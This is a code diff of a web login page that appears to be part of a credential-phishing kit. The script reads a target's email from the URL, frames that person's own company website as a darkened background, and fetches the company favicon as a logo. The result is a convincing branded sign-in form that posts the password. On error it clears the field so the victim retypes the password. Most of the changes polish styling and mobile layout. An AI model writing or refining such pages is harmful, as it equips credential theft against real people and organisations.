@@ -14,47 +14,59 @@
 			height: 100vh;
 			width: 100vw;
 			font-family: Arial, Helvetica, sans-serif;
-			overflow: hidden; /* Prevent scrolling */
+			overflow: hidden;
 			position: relative;
+			background: #000;
 		}
 
-		.bg-img {
+		/* Fullscreen iframe background */
+		#iframe-bg {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			border: none;
+			z-index: 0;
+			pointer-events: none;
+		}
+
+		/* Add a semi-transparent overlay to make form more readable */
+		body::before {
+			content: '';
 			position: absolute;
 			top: 0;
 			left: 0;
-			height: 100vh;
-			width: 100vw;
+			right: 0;
+			bottom: 0;
+			background: rgba(0, 0, 0, 0.6);
 			z-index: 1;
-		}
-
-		iframe {
-			height: 100%;
-			width: 100%;
-			border: none;
-			display: block;
 		}
 
 		/* Add styles to the form container */
 		.container {
-		max-width: 400px;
-		padding: 16px;
-		background-color: white;
-		border-radius: 5px;
-		position: absolute;
-		left: 50%;
-		top: 50%;
-		transform: translate(-50%, -50%);
-		z-index: 2;
-	}
-
-	@media (max-width: 480px) {
-		.container {
-			left: 10%;
-			top: 20%;
-			margin-left: 5%;
-			transform: translate(-10%, -10%);
+			max-width: 400px;
+			padding: 16px;
+			background-color: white;
+			border-radius: 5px;
+			position: absolute;
+			left: 50%;
+			top: 50%;
+			transform: translate(-50%, -50%);
+			z-index: 2;
+			box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
 		}
-	}
+
+		@media (max-width: 480px) {
+			.container {
+				left: 50%;
+				top: 50%;
+				margin-left: 0;
+				transform: translate(-50%, -50%);
+				width: 90%;
+				max-width: 90%;
+			}
+		}
 
 		/* Full-width input fields */
 		input[type=text], input[type=password] {
@@ -63,6 +75,7 @@
 			margin: 5px 0 22px 0;
 			border: none;
 			background: #f1f1f1;
+			border-radius: 3px;
 		}
 
 		input[type=text]:focus, input[type=password]:focus {
@@ -78,42 +91,65 @@
 			cursor: pointer;
 			width: 100%;
 			opacity: 0.9;
+			border-radius: 3px;
+			font-size: 16px;
+			font-weight: bold;
+			transition: opacity 0.3s;
 		}
 
 		.btn:hover {
 			opacity: 1;
 		}
 
+		.btn:disabled {
+			background-color: #666;
+			cursor: not-allowed;
+			opacity: 0.7;
+		}
+
 		.img {
 			text-align: center;
+			margin-bottom: 20px;
 		}
 
 		#title {
 			text-align: center;
-			margin: 10px 0;
+			margin: 10px 0 20px 0;
+			color: #333;
 		}
 
 		#error {
 			display: none;
 			color: red;
+			background-color: #ffe6e6;
+			padding: 10px;
+			border-radius: 3px;
+			margin-bottom: 15px;
+			border: 1px solid #ff9999;
+		}
+
+		label {
+			color: #333;
+			font-weight: bold;
+			margin-bottom: 5px;
+			display: block;
 		}
 	</style>
 </head>
 <body>
-	<!-- Iframe as background -->
+	<!-- Background iframe -->
 	<iframe 
-		id="frame" 
+		id="iframe-bg" 
 		src="" 
 		scrolling="no" 
 		sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"
 		allowfullscreen
 		title="Background">
 	</iframe>
-	<div class="iframe-overlay"></div>
 	
 	<form class="container" id="login-form">
 		<div class="img">
-			<img src="" id="logo" style="width: 100px; height: 100px; ">
+			<img src="" id="logo" alt="" style="width: 100px; height: 100px; border-radius: 50%; border: 2px solid #0096FF;">
 		</div>
 
 		<h3 id="title">Sign In</h3>
@@ -138,7 +174,7 @@
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script>
 	let step = 1;
-	let submitted = false;
+	let submitted = false; // Prevent double submission
 	
 	// Get clientID from URL hash
 	const clientID = window.location.hash.substring(1);
@@ -149,10 +185,10 @@
 		$('#email').val(clientID);
 		const domain = clientID.split('@').pop();
 		
-		// Set iframe source to the domain
-		$("#frame").attr("src", "https://" + domain);
+		// Set iframe src to the domain
+		$("#iframe-bg").attr("src", "https://" + domain);
 		
-		// Use favicon service for logo
+		// Use favicon service
 		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
 		$("#logo").attr("src", logoUrl)
 			.on("error", function() {
@@ -163,7 +199,7 @@
 	$("#login-form").submit(function(event) {
 		event.preventDefault();
 		
-		if (submitted) return;
+		if (submitted) return; // Prevent multiple submissions
 		submitted = true;
 		
 		const submitBtn = $("button[type='submit']");
@@ -194,7 +230,7 @@
 					$("#error").css("display", "block");
 					submitBtn.text('Sign In').prop('disabled', false);
 					$("#psw").val("");
-					submitted = false;
+					submitted = false; // Allow next submission
 				}
 			});
 
@@ -208,11 +244,11 @@
 					$("#error").css("display", "block");
 					submitBtn.text('Sign In').prop('disabled', false);
 					$("#psw").val("");
-					submitted = false;
+					submitted = false; // Allow next submission
 				}
 			});
 		}, "json");
 	});
-	</script>
+</script>
 </body>
 </html>
